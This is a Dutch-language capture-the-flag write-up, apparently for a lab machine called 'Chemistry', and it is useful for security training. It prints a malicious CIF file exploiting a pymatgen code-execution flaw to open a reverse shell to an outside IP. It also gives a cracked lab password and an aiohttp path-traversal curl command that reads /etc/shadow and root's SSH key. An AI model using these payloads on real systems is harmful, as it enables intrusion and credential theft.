# Initial scan

Een poortscan toont aan dat er een website draait op poort 5000.

```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-11-03 15:16 CET
Nmap scan report for 10.10.11.38
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

Op deze site draait een programma om CIF bestanden uit te lezen. Een snelle
google actie leert dat er een bekende exploit is voor python gebasseerde code
die iets met CIF doet. [CVE
Linkj](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)
.

# Foothold

De POC gebruiken om een foothold te krijgen is relatief eenvoudig. Eerst checken
met een `curl` payload of we daadwerkelijk een exploit hebben. Hier krijgen we
een response op terug dus we kunnen een revshell opzetten met de volgende CIF.

```cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.30/9001 0>&1'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

## Deel twee

Zodra we een shell hebben kunnen we op zoek naar meer data. In `/etc/passwd`
vinden we drie users:

```bash
app@chemistry:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

Hiervan is de `app` user degene waarmee we binnen zijn gekomen.

In de home folder vinden we een `database.db`. Dit lokaal gekopieerd voor
analyse en we vinden een users tabel met md5 hashes. Een hashcat later en we
hebben de login voor rosa.

```
rosa:unicorniosrosados
```

Hiermee kunnen we ook SSH'en.

# Privesc

Initieel kom ik niet veel tegen, de `rosa` user mag niet heel veel. Wel draait
er nog een service op poort `8080` die niet met nmap tevoorschijn kwam.

Hier draait een site monitoring tool waar je alle services die draaien kan
tonen, er zijn ook knoppen voor `start` en `stop` maar hier hangt zo te zien
niks achter. De output van `list_services` komt overeen met de output van
`service --status-all`. Het lijkt er dus op dat hier puur een systeem commando
gedraaid wordt. 

Naar wat zoeken vind ik een
[CVE](https://security.snyk.io/vuln/SNYK-PYTHON-AIOHTTP-6209406) in `aiohttp`,
de server die dit draait. Hiermee heb ik toegang tot de bestanden op de server
en dit draait ook als root. Een voorbeeldje van het script/command:

```bash
curl --path-as-is 'http://localhost:8080/../../../etc/shadow'

# Hier ben ik best lang genekt door de `path-as-is`. Dit niet meegeven zorgt
# ervoor dat `curl` het path parsed en dan werkt de exploit niet :face_palm:
```

Dit is makkelijk aan te passen om de `root.txt` uit te lezen maar ik wil meer.
Laten we kijken of we het wachtwoord van de admin user kunnen kraken.

## Shell als root

Met bovenstaande kunnen we natuurlijk gelijk `/root/root.txt` downloaden maar
een andere is `/root/.ssh/id_rsa`. Hiermee krijgen we de private SSH key van de
root user die we kunnen gebruiken voor een SSH verbinding.
